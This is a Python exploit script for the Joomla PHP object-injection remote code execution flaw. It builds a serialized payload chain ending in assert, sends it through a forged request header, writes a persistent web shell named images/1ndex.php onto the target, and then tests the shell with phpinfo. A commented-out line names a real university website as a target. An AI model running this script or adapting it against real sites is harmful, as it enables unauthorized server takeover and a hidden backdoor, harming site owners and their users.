#!/usr/bin/env python
# coding: utf-8
 
import requests 
 
def get_url(url, user_agent):
 
    headers = {
    #'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0'
    'UX-Forwarded-For': user_agent
    }
    cookies = requests.get(url,headers=headers).cookies
    for _ in range(3):
        response = requests.get(url, headers=headers,cookies=cookies)
    #print cookies
    return response
   
def php_str_noquotes(data):
    "Convert string to chr(xx).chr(xx) for use in php"
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format(ord(char))
 
    return encoded[:-1]
 
 
def generate_payload(php_payload):
 
    php_payload = "eval({0})".format(php_str_noquotes(php_payload))
 
    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
 
    return exploit_template
 

def check_file(base_url):
    url = base_url + 'images/1ndex.php?a=assert'
    payload = {
        '1nd3x_php': '${phpinfo()}'
    }

    # print url;
    r = requests.post(url, data=payload)

    if( r.content.find('PHP Version') > 0 ):
        return True
    else: 
        return False


def get_shell(base_url): 
    # pl = generate_payload("system('touch /tmp/fx');")
    pl = generate_payload("""fwrite(fopen(dirname(__FILE__).'/../../images/1ndex.php', 'w+'), '<?php $e = $_REQUEST['e']; register_shutdown_function($e, $_REQUEST['pass']); ?>');""")
    #call_user_func_array('assert', array($_REQUEST['1nd3x_php']));
    #base_url = 'http://www.fc.fudan.edu.cn/'
    print get_url(base_url, pl)
    print check_file(base_url)


if __name__ == '__main__':
    import sys
    #if len(sys.argv) != 2:
        #print 'Usage: {} <url>'.format(sys.argv[0])
        #sys.exit(-1)

    #base_url = sys.argv[1]
    #if not base_url.endswith('/'):
        #base_url += '/'

    base_url = 'http://192.168.10.53/'
    get_shell(base_url)
